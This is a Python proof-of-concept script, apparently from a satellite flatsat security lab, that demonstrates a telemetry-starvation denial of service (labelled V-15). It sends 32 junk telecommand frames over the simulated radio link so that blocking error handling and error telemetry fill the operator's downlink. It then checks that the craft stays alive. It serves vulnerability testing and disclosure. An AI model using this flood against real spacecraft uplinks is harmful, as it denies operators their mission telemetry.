#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-15  Uplink flood -> telemetry starvation (DoS without crash): every
# malformed TC costs a ledBlink (1.6-3.2 s blocking) + an error TM that
# itself goes out AES-wrapped. 30 junk frames freeze the beacon window.
# SPARTA: IM-0001 (availability, mission window loss)
def main(dev, ev):
    junk = b"\xFF" * 32
    errs = 0
    for i in range(32):
        tms = dev.tc(0x01, junk, via="radio", encrypt=False)
        if dev.err_text(tms) == "AES DECRYPT FAIL":
            errs += 1
    ev.log(f"{errs}/32 junk frames -> error TMs (each also AES-wrapped)")
    check(errs >= 30, "error storm emitted")
    err_frames = dev.tc(0x28, b"", via="radio")
    check(dev.err_text(err_frames) == "Error Unknown APID", "unknown APID storm too")
    # on-air cost: each error TM = 38 B @ 1200 bps = 0.25 s TX
    #           + blocking ledBlink 1.6-3.2 s per error in the handler
    tx_s = 33 * 38 * 8 / 1200.0
    blink_s = 33 * 1.6
    ev.log(f"downlink occupied: {tx_s:.1f} s TX + {blink_s:.0f}-66 s of "
           f"blocking blink in the command loop -> 18 s beacon cadence lost, "
           f"no TM delivered during the stall")
    # device recovers (no crash): after the storm the mission TM resumes
    dev.tc(0x05, b"\x01", via="usb")
    bcs = dev.find(dev.advance(3000), 0x01)
    check(bcs, "craft alive after storm (silent DoS, not a crash)")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(st.u8(1) == 1, "mission mode still NOMINAL")
    ev.log("=> attacker jams the OPERATOR's own telemetry with 33 valid-format frames")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-15 uplink starvation DoS", main))
